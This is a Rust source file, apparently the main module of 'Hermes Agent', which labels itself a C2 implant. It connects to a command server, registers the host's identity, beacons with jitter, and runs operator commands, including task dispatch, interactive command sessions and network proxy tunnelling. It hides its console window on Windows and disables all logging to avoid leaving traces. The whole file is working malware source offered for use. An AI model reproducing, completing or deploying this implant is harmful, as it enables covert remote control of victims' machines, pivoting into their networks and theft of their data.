//! Hermes Agent - Microkernel C2 Implant

#![allow(unused_variables)]
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

pub mod kernel;
pub mod ops;
pub mod protocol;
pub mod server;
pub mod services;
pub mod sys;

use kernel::Kernel;
use ops::AgentConfig;
use protocol::{AgentMessage, Config, ServerCommand};
use services::{HeartbeatService, NetworkService, ProxyService, SessionService, TaskService};
use std::{
    sync::{mpsc, Arc, Mutex},
    time::Duration,
};

// Agent never writes to disk — no logging, no file I/O outside of explicit
// user-requested operations (file upload/download, screenshot save).
macro_rules! alog { ($($arg:tt)*) => {{}} }

fn main() {

    let cfg = match Config::load() {
        Ok(c) => c,
        Err(_) => std::process::exit(0),
    };

    let kernel = Kernel::new();

    let op_cfg = AgentConfig {
        agent_id: cfg.metadata.agent_id.clone(),
        hostname: cfg.metadata.hostname.clone(),
        username: cfg.metadata.username.clone(),
        pid: cfg.metadata.pid,
        max_output_chars: cfg.max_output_chars,
        max_list_entries: cfg.max_list_entries,
        command_timeout_secs: cfg.command_timeout_secs,
    };

    let (outbox_tx, outbox_rx) = mpsc::channel::<AgentMessage>();
    let network = Arc::new(Mutex::new(NetworkService::new()));
    let heartbeat = Arc::new(Mutex::new(HeartbeatService::new()));
    heartbeat
        .lock()
        .unwrap()
        .update(cfg.heartbeat_secs, cfg.jitter);
    let task = Arc::new(Mutex::new(TaskService::new(
        op_cfg.clone(),
        outbox_tx.clone(),
    )));
    let session = Arc::new(Mutex::new(SessionService::new(op_cfg, outbox_tx.clone())));
    let proxy = Arc::new(Mutex::new(ProxyService::new(outbox_tx.clone())));

    loop {
        alog!("run_once starting");
        if run_once(
            &kernel, &cfg, &network, &heartbeat, &task, &session, &proxy, &outbox_tx, &outbox_rx,
        )
        .is_err()
        {
            alog!("run_once failed, reconnect in {}s", cfg.reconnect_secs);
        } else {
            alog!("run_once returned Ok");
        }
        kernel.sleep(std::time::Duration::from_secs(cfg.reconnect_secs));
    }
}

fn run_once(
    kernel: &Kernel,
    cfg: &Config,
    network: &Arc<Mutex<NetworkService>>,
    heartbeat: &Arc<Mutex<HeartbeatService>>,
    task: &Arc<Mutex<TaskService>>,
    session: &Arc<Mutex<SessionService>>,
    proxy: &Arc<Mutex<ProxyService>>,
    outbox_tx: &mpsc::Sender<AgentMessage>,
    outbox_rx: &mpsc::Receiver<AgentMessage>,
) -> Result<(), ()> {
    clear_outbox(outbox_rx);

    // Connect
    {
        let mut net = network.lock().unwrap();
        if !net.connect(&cfg.server_addr) {
            alog!("connect failed to {}", cfg.server_addr);
            return Err(());
        }
        alog!("connected to {}", cfg.server_addr);
    }

    // Receive hello
    let hello = {
        let mut net = network.lock().unwrap();
        net.receive_hello()
    };

    // Build register
    let (sleep_interval, jitter) = {
        let heartbeat = heartbeat.lock().unwrap();
        (heartbeat.interval_secs(), heartbeat.jitter())
    };
    let register = protocol::build_register(cfg, hello.as_ref(), sleep_interval, jitter);

    // Send register
    {
        let mut net = network.lock().unwrap();
        if net.send(&register).is_err() {
            alog!("register send failed");
            return Err(());
        }
        alog!("register sent");
    }

    loop {
        let heartbeat_wait = heartbeat.lock().unwrap().wait_duration();
        let wait = if session.lock().unwrap().should_poll_fast()
            || proxy.lock().unwrap().should_poll_fast()
        {
            heartbeat_wait.min(Duration::from_millis(100))
        } else {
            heartbeat_wait
        };

        let line = {
            let mut net = network.lock().unwrap();
            net.read_line(wait)
        };

        match line {
            Ok(Some(line)) => {
                alog!("read_line got: {}", &line[..line.len().min(200)]);
                let cmd: ServerCommand = match serde_json::from_str(&line) {
                    Ok(c) => c,
                    Err(_) => continue,
                };

                match cmd {
                    ServerCommand::Disconnect { .. } => {
                        alog!("got Disconnect, returning Ok");
                        return Ok(());
                    }
                    ServerCommand::DispatchTask {
                        task_id,
                        command,
                        payload,
                    } => {
                        task.lock()
                            .unwrap()
                            .dispatch(&task_id, &command, payload.as_deref());
                    }
                    ServerCommand::ExecuteCommandSession {
                        command_session_id,
                        request_id,
                        line,
                    } => {
                        session
                            .lock()
                            .unwrap()
                            .execute(&command_session_id, &request_id, &line);
                    }
                    ServerCommand::OpenCommandSession { command_session_id } => {
                        session.lock().unwrap().open(&command_session_id);
                    }
                    ServerCommand::CloseCommandSession { command_session_id } => {
                        session.lock().unwrap().close(&command_session_id);
                    }
                    ServerCommand::CancelTask { task_id } => {
                        task.lock().unwrap().cancel(&task_id);
                    }
                    ServerCommand::UpdateBeaconConfig {
                        request_id,
                        sleep_interval,
                        jitter,
                    } => {
                        heartbeat.lock().unwrap().update(sleep_interval, jitter);
                        let _ = outbox_tx.send(AgentMessage::ConfigUpdated {
                            request_id,
                            sleep_interval,
                            jitter,
                        });
                    }
                    ServerCommand::OpenProxy {
                        proxy_id,
                        bind_addr,
                    } => {
                        proxy.lock().unwrap().open(&proxy_id, &bind_addr);
                    }
                    ServerCommand::ProxyConnect {
                        proxy_id,
                        stream_id,
                        host,
                        port,
                    } => {
                        proxy
                            .lock()
                            .unwrap()
                            .connect(&proxy_id, &stream_id, &host, port);
                    }
                    ServerCommand::ProxyData {
                        proxy_id,
                        stream_id,
                        data_base64,
                    } => {
                        proxy
                            .lock()
                            .unwrap()
                            .data(&proxy_id, &stream_id, &data_base64);
                    }
                    ServerCommand::ProxyClose {
                        proxy_id,
                        stream_id,
                    } => {
                        proxy.lock().unwrap().close_stream(&proxy_id, &stream_id);
                    }
                    ServerCommand::CloseProxy { proxy_id } => {
                        proxy.lock().unwrap().close_proxy(&proxy_id);
                    }
                    _ => {
                        alog!("unhandled ServerCommand: {}", line);
                    }
                }

                flush_outbox(network, outbox_rx, None)?;
            }
            Ok(None) => {
                alog!("read_line returned Ok(None) - server closed connection");
                return Ok(());
            }
            Err(_) => {
                let poll_fast = session.lock().unwrap().should_poll_fast()
                    || proxy.lock().unwrap().should_poll_fast();
                let hb_due = heartbeat.lock().unwrap().should_send();
                alog!("read timeout: poll_fast={} hb_due={}", poll_fast, hb_due);
                if poll_fast {
                    flush_outbox(network, outbox_rx, None)?;
                    alog!("after cmd/proxy flush_outbox OK, looping");
                    session.lock().unwrap().clear_flush_hint();
                    proxy.lock().unwrap().clear_flush_hint();
                }
                if heartbeat.lock().unwrap().should_send() {
                    alog!("sending heartbeat");
                    flush_outbox(
                        network,
                        outbox_rx,
                        Some(AgentMessage::Heartbeat {
                            agent_id: Some(cfg.metadata.agent_id.clone()),
                        }),
                    )?;
                    heartbeat.lock().unwrap().sent();
                }
            }
        }
    }
}

fn clear_outbox(outbox_rx: &mpsc::Receiver<AgentMessage>) {
    while outbox_rx.try_recv().is_ok() {}
}

fn flush_outbox(
    network: &Arc<Mutex<NetworkService>>,
    outbox_rx: &mpsc::Receiver<AgentMessage>,
    heartbeat: Option<AgentMessage>,
) -> Result<(), ()> {
    let mut messages = Vec::new();
    if let Some(heartbeat) = heartbeat {
        messages.push(heartbeat);
    }
    while let Ok(message) = outbox_rx.try_recv() {
        messages.push(message);
    }
    if messages.is_empty() {
        return Ok(());
    }

    let mut net = network.lock().unwrap();
    for message in messages {
        net.send(&message)?;
    }
    Ok(())
}
